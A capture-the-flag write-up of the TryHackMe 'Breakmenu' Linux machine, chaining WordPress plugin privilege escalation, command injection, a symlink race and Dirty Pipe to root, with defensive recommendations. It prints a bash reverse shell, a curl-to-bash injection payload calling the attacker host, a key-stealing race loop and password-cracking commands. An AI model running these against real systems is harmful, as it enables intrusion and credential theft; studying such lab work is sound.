````md
# TryHackMe - Breakmenu Writeup

> **Platform:** TryHackMe  
> **Machine:** Breakmenu  
> **Difficulty:** Medium  
> **OS:** Linux  
> **Target IP:** `10.48.131.151`

---

# Introduction

Today we are back with another TryHackMe challenge named **Breakmenu**.

The scenario provided by the machine is:

> "We think our system is secure, hack it and prove us wrong."

The main target IP is:

```text
10.48.131.151
````

The attack path includes:

* Network enumeration
* Web enumeration
* WordPress enumeration
* Credential discovery
* WordPress privilege escalation
* WordPress theme abuse
* Initial shell as `www-data`
* Internal service enumeration
* SSH tunneling
* Command injection
* Shell access as `john`
* Race condition exploitation
* SSH private key extraction
* SSH key passphrase cracking
* Access as `youcef`
* Sudo enumeration
* Dirty Pipe exploitation
* Root access

---

# Part 1 - Initial Reconnaissance

## Nmap Port Scan

We start with a full TCP port scan against the target.

```bash
nmap -p- 10.48.131.151
```

The scan reveals:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two TCP services are exposed:

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

The web server is therefore the main attack surface at this stage.

---

# Service and Version Detection

Now perform service and version detection:

```bash
nmap -sC -sV 10.48.131.151
```

Important results:

```text
22/tcp open  ssh   OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp open  http  Apache httpd 2.4.56 ((Debian))
```

The HTTP server is:

```text
Apache/2.4.56 (Debian)
```

The SSH service is:

```text
OpenSSH 8.4p1 Debian 5+deb11u1
```

The target is running Linux.

---

# Part 2 - Web Enumeration

Opening:

```text
http://10.48.131.151/
```

shows the default Apache page.

The source page does not immediately provide anything useful.

Therefore, directory enumeration is performed.

---

# Directory Enumeration

Using Gobuster:

```bash
gobuster dir \
-u http://10.48.131.151/ \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting results include:

```text
/wordpress    (Status: 301)
/manual       (Status: 301)
/server-status (Status: 403)
```

The most interesting discovery is:

```text
/wordpress/
```

This indicates that a WordPress installation is running on the target.

---

# File Enumeration

File enumeration is also performed:

```bash
gobuster dir \
-u http://10.48.131.151/ \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting results include:

```text
/.htaccess
/.htpasswd
/.hta
/index.html
/manual
/server-status
/wordpress
```

The WordPress installation becomes the primary target.

---

# Part 3 - WordPress Enumeration

We now run WPScan against the WordPress installation:

```bash
wpscan --url http://10.48.131.151/wordpress/
```

WPScan identifies several interesting components.

---

# WordPress Version

The installed WordPress version is:

```text
6.4.3
```

WPScan identifies it through the WordPress RSS generator.

```text
WordPress version 6.4.3
```

---

# WordPress Theme

The active theme is:

```text
Twenty Twenty-Four
```

The detected version is:

```text
1.0
```

WPScan also reports that the theme is outdated.

---

# WordPress XML-RPC

WPScan identifies:

```text
/wordpress/xmlrpc.php
```

as accessible.

XML-RPC appears to be enabled.

---

# WP-Cron

The external WP-Cron endpoint is also detected:

```text
/wordpress/wp-cron.php
```

---

# Part 4 - WordPress Plugin Enumeration

WPScan identifies the following plugin:

```text
wp-data-access
```

The detected version is:

```text
5.3.5
```

This is particularly interesting because the plugin version is outdated and several vulnerabilities are reported.

---

# Vulnerabilities Identified by WPScan

WPScan reports multiple vulnerabilities affecting the installed `wp-data-access` plugin.

Some of the important findings include:

```text
WP Data Access < 5.3.8
Subscriber+ Privilege Escalation
CVE-2023-1874
```

Other vulnerabilities reported include:

```text
CVE-2023-33999
CVE-2024-43295
CVE-2024-12428
CVE-2025-39582
CVE-2026-0557
CVE-2024-13362
CVE-2026-42665
CVE-2026-18032
```

The most interesting vulnerability for this machine is:

```text
CVE-2023-1874
```

---

# CVE-2023-1874

CVE-2023-1874 is a privilege escalation vulnerability affecting the WP Data Access plugin.

The vulnerable versions include versions up to:

```text
5.3.7
```

The installed version is:

```text
5.3.5
```

Therefore, the installed plugin falls within the vulnerable range.

The vulnerability allows a low-privileged authenticated WordPress user to escalate privileges.

An exploit implementation is available at:

```text
https://github.com/thomas-osgood/cve-2023-1874
```

---

# Part 5 - WordPress User Enumeration

WPScan is also used to enumerate WordPress users.

The following accounts are discovered:

```text
admin
bob
```

WPScan confirms these accounts through several enumeration methods.

The users can then be targeted for credential testing.

---

# Password Brute Force

The following command is used:

```bash
wpscan \
--url http://10.48.131.151/wordpress/ \
-U admin,bob \
-P /usr/share/wordlists/rockyou.txt
```

The scan eventually identifies valid credentials:

```text
Username: bob
Password: soccer
```

We now have valid WordPress credentials for:

```text
bob:soccer
```

---

# Part 6 - Exploiting CVE-2023-1874

The CVE-2023-1874 exploit is executed against the WordPress installation.

The exploit successfully performs the following:

```text
cookies set
login success
profile source successfully grabbed
wpnonce obtained
userid identified
color-nonce obtained
admin privileges successfully granted to "bob"
exploit completed successfully
```

The important result is:

```text
bob
```

has now been elevated to:

```text
Administrator
```

---

# WordPress Administrator Access

We can now log in to the WordPress administration panel as:

```text
Username: bob
Password: soccer
```

The account has administrator privileges.

This gives us access to WordPress theme editing functionality.

---

# Part 7 - WordPress Theme Editor

The Twenty Twenty-One theme is selected.

The following theme editor endpoint is used:

```text
/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone
```

The `404.php` template can be edited through the administrator interface.

This provides a location where server-side PHP code can be introduced.

The modified file is then accessed through:

```text
/wordpress/wp-content/themes/twentytwentyone/404.php
```

When the modified page is requested, the inserted payload executes on the server.

---

# Part 8 - Initial Shell as www-data

A Netcat listener is started:

```bash
rlwrap nc -lvnp 4444
```

The callback connects successfully.

The resulting shell identifies the current account as:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

We now have:

```text
www-data@Breakme
```

The shell is initially non-interactive:

```text
bash: cannot set terminal process group
bash: no job control in this shell
```

---

# Enumerating /home

Move into `/home`:

```bash
cd /home
ls
```

The user `john` is discovered.

```text
/home/john
```

Inside John's home directory:

```text
internal
user1.txt
```

The directory:

```text
/home/john/internal
```

cannot be accessed by `www-data`.

This suggests that another route is required to obtain John's access.

---

# Part 9 - Internal Services

Since the externally exposed ports only included SSH and HTTP, internal services are enumerated from the compromised machine.

Run:

```bash
ss -tulnp
```

The important results are:

```text
tcp LISTEN 0 128 0.0.0.0:22
tcp LISTEN 0 80  127.0.0.1:3306
tcp LISTEN 0 4096 127.0.0.1:9999
tcp LISTEN 0 511 *:80
```

The most interesting internal service is:

```text
127.0.0.1:9999
```

This service is not directly accessible from the attacker's machine.

Therefore, port forwarding is required.

---

# Part 10 - SSH Reverse Port Forwarding

A reverse SSH tunnel is created:

```bash
ssh -N -R 127.0.0.1:8087:127.0.0.1:9999 kali@192.168.138.6
```

The SSH connection is established.

After the tunnel is created, the internal service becomes accessible locally through:

```text
127.0.0.1:8087
```

Opening:

```text
http://127.0.0.1:8087/
```

allows us to interact with the internal web application.

---

# Part 11 - Internal Web Application

The internal service provides a web interface.

The page contains a functionality for checking a user.

The input field is:

```text
Check User
```

This functionality becomes interesting because the supplied input appears to be processed by a backend command.

This leads to investigation of possible command injection.

---

# Command Injection

The input can be abused for command injection.

A reverse shell payload is prepared:

```bash
/bin/bash -i >& /dev/tcp/192.168.138.6/4446 0>&1
```

The payload is saved as:

```text
payload.sh
```

A listener is started:

```bash
rlwrap nc -lvnp 4446
```

The command injection payload is then used:

```text
|curl${IFS}http://192.168.138.6/payload.sh|bash
```

The use of:

```text
${IFS}
```

allows command separators/spaces to be represented without using a literal space.

The server downloads and executes the payload.

---

# Part 12 - Shell as John

The reverse shell connects back:

```text
connect to [192.168.138.6] from (UNKNOWN) [10.48.131.151]
```

The resulting shell is:

```text
john@Breakme:~/internal$
```

We have successfully moved from:

```text
www-data
```

to:

```text
john
```

---

# Stabilizing the Shell

The shell can be upgraded using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then on the attacker machine:

```bash
stty raw -echo
fg
```

Set the terminal:

```bash
export TERM=xterm-256color
```

The shell is now stabilized.

---

# User Flag

John's home directory contains:

```text
user1.txt
```

The first user flag can be read from:

```text
/home/john/user1.txt
```

---

# Part 13 - Privilege Escalation to Youcef

Now that we have access as:

```text
john
```

we enumerate other users and their files.

The directory:

```text
/home/youcef
```

is accessible enough to reveal an interesting SUID binary.

List the directory:

```bash
ls -lah /home/youcef
```

Important files:

```text
-rwsr-sr-x 1 youcef youcef 17K Aug 2 2023 readfile
-rw------- 1 youcef youcef 1.1K Aug 2 2023 readfile.c
```

The important binary is:

```text
/home/youcef/readfile
```

It has the SUID bit set.

---

# readfile SUID Binary

The source file:

```text
readfile.c
```

provides insight into the binary's functionality.

The program:

1. Checks whether an argument is supplied.
2. Checks whether the supplied file exists.
3. Checks whether the executing user has UID `1002`, corresponding to `john`.
4. Checks whether the filename contains `flag` or `id_rsa`.
5. Performs checks on symbolic links and read permissions.
6. Sleeps briefly.
7. Opens the requested file.
8. Reads and prints its contents.

The important issue is the delay between the security checks and the actual file operation.

This creates a:

```text
TOCTOU Race Condition
```

---

# Understanding the Race Condition

The application performs a check on a file and then later opens that same path.

Between these two operations, the file can be changed.

The basic idea is:

```text
Check
  ↓
Delay
  ↓
Open
```

If the file changes during the delay, the program may validate one object but open another.

We can exploit this by repeatedly switching a path between:

```text
Regular file
```

and:

```text
Symbolic link
```

---

# Exploiting the Race Condition

First, create a loop that constantly changes the file:

```bash
while true; do
    touch file
    sleep 0.3
    ln -sf /home/youcef/.ssh/id_rsa file
    sleep 0.3
    rm file
done &
```

The goal is to make the application see a normal file during its security checks and then encounter a symbolic link when it eventually opens the file.

A second loop continuously executes the vulnerable binary:

```bash
while true; do
    out=$(/home/youcef/readfile file | grep -Ev 'Found|guess' | grep .)
    if [[ -n "$out" ]]; then
        echo -e "$out"
        break
    fi
done
```

Eventually the race is won.

The program reads:

```text
/home/youcef/.ssh/id_rsa
```

The SSH private key is recovered.

---

# Alternative Race Loop

Another race loop used during the process is:

```bash
while true; do
    ln -sf /home/youcef/.ssh/id_rsa symlink
    rm symlink
    touch symlink
done &
```

This continuously switches the target between a symbolic link and a regular file.

---

# Part 14 - Cracking the SSH Private Key

The recovered private key is protected by a passphrase.

Therefore, it cannot immediately be used for SSH authentication.

First convert the SSH key into a John-compatible hash:

```bash
ssh2john id_rsa > hash
```

Then crack it using RockYou:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John the Ripper successfully recovers the passphrase:

```text
a123456
```

Therefore:

```text
SSH Key Passphrase: a123456
```

---

# SSH Access as Youcef

The recovered private key can now be used to authenticate as `youcef`.

The account is:

```text
youcef
```

The recovered passphrase is:

```text
a123456
```

This provides access to the next stage of the machine.

---

# User 2 Flag

The second user flag is located at:

```text
/home/youcef/.ssh/user2.txt
```

This confirms successful access to the `youcef` account.

---

# Part 15 - Sudo Enumeration

Now enumerate sudo permissions:

```bash
sudo -l
```

The result is:

```text
User youcef may run the following commands on breakme:

(root) NOPASSWD: /usr/bin/python3 /root/jail.py
```

This means `youcef` can execute:

```text
/usr/bin/python3 /root/jail.py
```

as root without entering a password.

The system is therefore ready for the final privilege escalation stage.

---

# Part 16 - Dirty Pipe Investigation

Further enumeration using LinPEAS identifies a possible:

```text
Dirty Pipe
```

vulnerability.

The machine's kernel is:

```text
5.10.0-8-amd64
```

This leads to investigating the Dirty Pipe privilege escalation vulnerability.

---

# Obtaining the Exploit

The exploit binary is downloaded from the attacker's machine:

```bash
wget http://192.168.138.6/exploit-static
```

The download succeeds:

```text
Length: 886912 (866K)
```

The file is then made executable:

```bash
chmod +x exploit-static
```

Execute the exploit:

```bash
./exploit-static
```

---

# Part 17 - Root Privilege Escalation

The exploit output shows:

```text
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...It worked!
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell...
(run commands now)
```

The exploit successfully provides a root shell.

Verify the current identity:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We now have:

```text
root@Breakme
```

---

# Root Flag

The final flag is located in the root user's directory:

```text
/root/root.txt
```

Read it using:

```bash
cat /root/root.txt
```

This completes the machine.

---

# Complete Attack Chain

```text
                         BREAKMENU
                            │
                            ▼
                    10.48.131.151
                            │
                            ▼
                     Nmap Enumeration
                            │
                            ▼
                       Port 80
                            │
                            ▼
                      Web Enumeration
                            │
                            ▼
                       /wordpress
                            │
                            ▼
                         WPScan
                            │
                            ├──────────────┐
                            ▼              ▼
                     Users Found      WP Data Access
                       admin/bob          5.3.5
                            │              │
                            ▼              ▼
                       bob:soccer     CVE-2023-1874
                            │              │
                            └──────┬───────┘
                                   ▼
                           WordPress Admin
                                   │
                                   ▼
                            Theme Editor
                                   │
                                   ▼
                              PHP Payload
                                   │
                                   ▼
                              www-data
                                   │
                                   ▼
                          Internal Enumeration
                                   │
                                   ▼
                          127.0.0.1:9999
                                   │
                                   ▼
                          SSH Port Forwarding
                                   │
                                   ▼
                           Internal Web App
                                   │
                                   ▼
                          Command Injection
                                   │
                                   ▼
                                john
                                   │
                                   ▼
                           SUID readfile
                                   │
                                   ▼
                         TOCTOU Race Condition
                                   │
                                   ▼
                         /home/youcef/.ssh/id_rsa
                                   │
                                   ▼
                           SSH Key Extraction
                                   │
                                   ▼
                           John the Ripper
                                   │
                                   ▼
                             a123456
                                   │
                                   ▼
                               youcef
                                   │
                                   ▼
                             sudo -l
                                   │
                                   ▼
                     /usr/bin/python3 /root/jail.py
                                   │
                                   ▼
                           Dirty Pipe
                                   │
                                   ▼
                                ROOT
                                   │
                                   ▼
                              root.txt
```

---

# Credentials Discovered

## WordPress

```text
Username: bob
Password: soccer
```

---

## Youcef SSH Key

```text
Username: youcef
SSH Key Passphrase: a123456
```

---

# Important Users

```text
www-data
john
youcef
root
```

---

# Important Ports

| Port | Service              | Exposure       |
| ---- | -------------------- | -------------- |
| 22   | SSH                  | External       |
| 80   | HTTP                 | External       |
| 3306 | MySQL                | Localhost only |
| 9999 | Internal Web Service | Localhost only |

---

# Important Files

```text
/wordpress/
/wordpress/xmlrpc.php
/wordpress/wp-cron.php
/wordpress/wp-content/plugins/wp-data-access/
/home/john/user1.txt
/home/john/internal/index.php
/home/youcef/readfile
/home/youcef/readfile.c
/home/youcef/.ssh/id_rsa
/home/youcef/.ssh/user2.txt
/root/jail.py
/root/root.txt
```

---

# Important Vulnerabilities

| Vulnerability           | Purpose                                |
| ----------------------- | -------------------------------------- |
| CVE-2023-1874           | WordPress privilege escalation         |
| Command Injection       | Internal web application to John shell |
| TOCTOU Race Condition   | Read Youcef's SSH private key          |
| Weak SSH Key Passphrase | Recover SSH key password               |
| Dirty Pipe              | Final privilege escalation to root     |

---

# Key Enumeration Commands

## Nmap

```bash
nmap -p- 10.48.131.151
nmap -sC -sV 10.48.131.151
```

## Gobuster

```bash
gobuster dir \
-u http://10.48.131.151/ \
-w /usr/share/wordlists/dirb/common.txt
```

## WPScan

```bash
wpscan --url http://10.48.131.151/wordpress/
```

## WordPress User Enumeration

```bash
wpscan \
--url http://10.48.131.151/wordpress/ \
-U admin,bob \
-P /usr/share/wordlists/rockyou.txt
```

## Internal Service Enumeration

```bash
ss -tulnp
```

## SSH Reverse Tunnel

```bash
ssh -N -R 127.0.0.1:8087:127.0.0.1:9999 kali@192.168.138.6
```

## Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## SSH Key Hash

```bash
ssh2john id_rsa > hash
```

## Crack SSH Passphrase

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Sudo Enumeration

```bash
sudo -l
```

---

# Lessons Learned

## 1. Always Enumerate the Web Application

The initial web server looked like a standard Apache installation.

However, directory enumeration revealed:

```text
/wordpress
```

which completely changed the attack path.

---

## 2. Keep WordPress and Plugins Updated

The installed WP Data Access plugin was:

```text
5.3.5
```

and was vulnerable to multiple security issues.

In particular:

```text
CVE-2023-1874
```

allowed the low-privileged WordPress account `bob` to become an administrator.

---

## 3. Do Not Ignore Internal Services

After obtaining the initial `www-data` shell, `ss -tulnp` revealed:

```text
127.0.0.1:9999
```

This service was not exposed externally.

Internal services can often contain functionality that is unavailable from the public attack surface.

---

## 4. SSH Tunneling Is Valuable During Post-Exploitation

The internal service was exposed to the attacker using:

```text
SSH reverse port forwarding
```

This allowed the internal application to be accessed through:

```text
127.0.0.1:8087
```

on the attacker machine.

---

## 5. Command Injection Can Turn Internal Access Into a Shell

The internal user-checking functionality accepted input that could be manipulated to execute commands.

This resulted in:

```text
www-data → john
```

---

## 6. TOCTOU Vulnerabilities Can Be Powerful

The `readfile` SUID binary performed security checks and then waited before opening the file.

This created a race window.

By repeatedly switching a file between:

```text
regular file
```

and:

```text
symbolic link
```

the checks could be passed while the final file operation targeted:

```text
/home/youcef/.ssh/id_rsa
```

---

## 7. SSH Private Keys Must Be Properly Protected

Even after obtaining the private key, it was protected by a passphrase.

However, the weak passphrase:

```text
a123456
```

was recoverable using a common password list.

Private keys should use strong, unique passphrases.

---

## 8. Kernel Enumeration Matters

Once access as `youcef` was obtained, LinPEAS identified the possibility of a kernel-level vulnerability.

The Dirty Pipe vulnerability ultimately provided root privileges.

This demonstrates why kernel version enumeration remains an important part of Linux privilege escalation.

---

# Defensive Recommendations

## WordPress

* Keep WordPress updated.
* Keep plugins updated.
* Remove unused plugins.
* Disable unnecessary XML-RPC functionality.
* Use strong unique passwords.
* Enforce MFA for administrator accounts.
* Restrict WordPress administrative access.

---

## WordPress File Permissions

The WordPress administrator should not unnecessarily have the ability to modify executable PHP files.

Consider restricting theme/plugin editing:

```php
define('DISALLOW_FILE_EDIT', true);
```

---

## Internal Services

Services bound to:

```text
127.0.0.1
```

should still be treated as sensitive.

Applications should validate and sanitize all user-controlled input regardless of whether the service is externally accessible.

---

## Command Injection Protection

Never pass raw user input into shell commands.

Use:

* Strict input validation
* Allowlists
* Safe APIs
* Parameterized command execution
* Proper escaping where unavoidable

---

## SUID Programs

Regularly audit SUID binaries.

The custom:

```text
/home/youcef/readfile
```

binary contained a race condition that allowed unauthorized file disclosure.

Security checks should be performed atomically where possible.

---

## SSH Keys

Private keys should:

* Use strong passphrases.
* Have restrictive permissions.
* Never be exposed through vulnerable applications.
* Be rotated if compromise is suspected.

---

## Kernel Updates

Keep Linux kernels patched.

The Dirty Pipe vulnerability demonstrates that an outdated kernel can provide a direct route to root even after application-level security controls are bypassed.

---

# Final Attack Path

```text
Nmap
  ↓
Apache
  ↓
WordPress
  ↓
WPScan
  ↓
Bob Credentials
  ↓
CVE-2023-1874
  ↓
WordPress Administrator
  ↓
Theme Editor
  ↓
www-data
  ↓
Internal Port 9999
  ↓
SSH Reverse Tunnel
  ↓
Command Injection
  ↓
john
  ↓
SUID readfile
  ↓
TOCTOU Race Condition
  ↓
Youcef's id_rsa
  ↓
John the Ripper
  ↓
SSH as youcef
  ↓
sudo -l
  ↓
Dirty Pipe
  ↓
root
```

---

# Conclusion

The **Breakmenu** machine demonstrates a complete multi-stage Linux compromise beginning with a seemingly ordinary Apache default page.

The initial enumeration exposed:

```text
22/tcp SSH
80/tcp HTTP
```

Directory enumeration then revealed a WordPress installation.

WPScan identified:

```text
WordPress 6.4.3
WP Data Access 5.3.5
```

along with several vulnerabilities.

User enumeration discovered:

```text
admin
bob
```

and password testing revealed:

```text
bob:soccer
```

The vulnerable WP Data Access plugin was then exploited using **CVE-2023-1874**, elevating Bob to WordPress administrator.

Administrator access allowed modification of a WordPress theme template, which provided the initial shell as:

```text
www-data
```

Post-exploitation enumeration revealed an internal service on:

```text
127.0.0.1:9999
```

SSH reverse port forwarding exposed this service to the attacker.

The internal application contained a command injection vulnerability, which was used to obtain a shell as:

```text
john
```

Further enumeration uncovered the SUID `readfile` binary.

Its unsafe check-then-use logic introduced a TOCTOU race condition that allowed the extraction of:

```text
/home/youcef/.ssh/id_rsa
```

The SSH private key was protected with the weak passphrase:

```text
a123456
```

After cracking the passphrase, SSH access was obtained as:

```text
youcef
```

Finally, kernel enumeration revealed the possibility of exploiting **Dirty Pipe**, which resulted in:

```text
uid=0(root)
```

The complete progression was:

```text
WordPress
    ↓
CVE-2023-1874
    ↓
Administrator
    ↓
www-data
    ↓
Internal Service
    ↓
Command Injection
    ↓
john
    ↓
TOCTOU Race Condition
    ↓
SSH Private Key
    ↓
youcef
    ↓
Dirty Pipe
    ↓
root
```

This machine was a strong exercise in chaining vulnerabilities rather than relying on a single exploit. Each stage provided the access or information required for the next stage.

---

# Skills Practiced

* Nmap
* Gobuster
* WPScan
* WordPress Enumeration
* WordPress Exploitation
* CVE Research
* CVE-2023-1874
* WordPress Privilege Escalation
* PHP/Web Shells
* Reverse Shells
* Linux Enumeration
* `ss` Network Enumeration
* SSH Tunneling
* Command Injection
* Linux Privilege Escalation
* SUID Enumeration
* TOCTOU Race Conditions
* Symbolic Link Abuse
* SSH Private Key Extraction
* ssh2john
* John the Ripper
* Sudo Enumeration
* Kernel Vulnerability Enumeration
* Dirty Pipe
* Linux Root Privilege Escalation

---

**Machine:** Breakmenu
**Platform:** TryHackMe
**Difficulty:** Medium
**OS:** Linux
**Target IP:** `10.48.131.151`

```
```
